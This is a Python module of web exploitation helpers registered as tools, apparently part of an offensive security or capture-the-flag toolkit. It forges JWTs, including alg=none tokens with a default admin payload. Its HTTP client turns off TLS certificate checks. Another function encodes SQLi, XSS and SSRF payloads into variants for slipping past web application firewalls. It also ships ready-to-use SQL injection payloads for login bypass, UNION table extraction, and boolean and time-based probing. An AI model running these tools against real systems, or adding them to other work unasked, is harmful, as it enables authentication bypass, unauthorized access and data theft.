"""Web exploitation helpers: JWT decode/forge, HTTP client, payload encoders."""

import base64
import json
import urllib.parse
import urllib.request

from ..registry import tool


def _b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _unb64url(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


@tool(category="web")
def jwt_decode(token: str) -> str:
    """Decode JWT header + payload (no signature verification)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return "Invalid JWT format: needs header.payload.signature."
    try:
        header = json.loads(_unb64url(parts[0]))
        payload = json.loads(_unb64url(parts[1]))
    except Exception as ex:
        return f"Failed to parse: {ex}"
    return (f"HEADER:\n{json.dumps(header, indent=2)}\n\n"
            f"PAYLOAD:\n{json.dumps(payload, indent=2)}\n\n"
            f"SIGNATURE (hex): {_unb64url(parts[2]).hex()}")


@tool(category="web")
def jwt_forge(header_json: str = '{"alg":"none","typ":"JWT"}', payload_json: str = '{"user":"admin"}', secret: str = "") -> str:
    """Forge a JWT. Empty secret = alg none (3 parts, empty signature). Secret set = HS256."""
    header = json.loads(header_json)
    payload = json.loads(payload_json)
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    if secret:
        import hmac, hashlib
        sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
        return f"HS256 token:\n{h}.{p}.{_b64url(sig)}"
    return f"alg=none token:\n{h}.{p}."


@tool(category="web")
def http_request(url: str, method: str = "GET", headers_csv: str = "", data: str = "", timeout: int = 15, max_body: int = 16384) -> str:
    """HTTP request (GET/POST/PUT/HEAD). headers_csv: 'Name: value' per line. data: request body."""
    import http.client
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return "Scheme must be http/https."
    if method.upper() == "HEAD":
        req = urllib.request.Request(url, method="HEAD")
        for line in headers_csv.strip().splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                req.add_header(k.strip(), v.strip())
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return f"STATUS: {resp.status}\n" + "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        except Exception as ex:
            return f"Error: {ex}"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    if parsed.scheme == "https":
        import ssl
        conn = http.client.HTTPSConnection(parsed.hostname, port, timeout=timeout,
                                           context=ssl._create_unverified_context())
    else:
        conn = http.client.HTTPConnection(parsed.hostname, port, timeout=timeout)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    try:
        conn.request(method.upper(), path, body=data if data else None, headers=_parse_headers(headers_csv))
        resp = conn.getresponse()
        body = resp.read(max_body)
        hdrs = "\n".join(f"{k}: {v}" for k, v in resp.getheaders())
        txt = body.decode("utf-8", "replace") if body else "(empty)"
        cookies = resp.getheader("Set-Cookie", "")
        return (f"URL: {url}\nSTATUS: {resp.status} {resp.reason}\nSET-COOKIE: {cookies or '-'}\n\nHEADERS:\n{hdrs}\n\nBODY (first {len(body)} bytes):\n{txt}")
    except Exception as ex:
        return f"Error: {ex}"
    finally:
        conn.close()


def _parse_headers(csv: str) -> dict:
    out = {}
    for line in csv.strip().splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out


@tool(category="web")
def payload_encoders(payload: str) -> str:
    """Encode an injection payload (SQLi/XSS/SSRF) into WAF-bypass variants: url, double-url, hex, unicode, charcode, null-byte."""
    enc = urllib.parse.quote(payload, safe="")
    dbl = urllib.parse.quote(enc, safe="")
    hexenc = "".join(f"0x{b:02x}" for b in payload.encode())
    unienc = "".join(f"%u{ord(c):04x}" for c in payload)
    charcode = "concat(" + "".join(f"chr({ord(c)})," for c in payload).rstrip(",") + ")"
    nul = urllib.parse.quote(payload.replace(" ", "%00 "), safe="")
    return (f"raw      : {payload}\n"
            f"url      : {enc}\n"
            f"double-url: {dbl}\n"
            f"hex (SQL): {hexenc}\n"
            f"unicode  : {unienc}\n"
            f"charcode : {charcode}\n"
            f"null-byte: {nul}")


@tool(category="web")
def sqli_payloads(kind: str = "auth_bypass") -> str:
    """Ready-to-use SQLi payloads. kind: auth_bypass / union / boolean / time."""
    sets = {
        "auth_bypass": [
            "' OR '1'='1", "' OR 1=1-- -", "' OR 1=1#", "' OR '1'='1'-- -",
            "admin'-- -", "' OR 1=1 LIMIT 1-- -", "') OR ('1'='1", "' UNION SELECT 1,2,3-- -",
        ],
        "union": [
            "' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -",
            "' UNION SELECT NULL,NULL,NULL-- -", "' UNION SELECT 1,2,3-- -",
            "' UNION SELECT group_concat(table_name) FROM information_schema.tables-- -",
        ],
        "boolean": ["' AND 1=1-- -", "' AND 1=2-- -", "' AND '1'='1", "' AND '1'='2"],
        "time": ["' AND SLEEP(5)-- -", "' AND (SELECT SLEEP(5))-- -", "'; WAITFOR DELAY '0:0:5'-- -"],
    }
    payloads = sets.get(kind, [])
    return f"SQLi {kind} ({len(payloads)} payloads):\n" + "\n".join(payloads)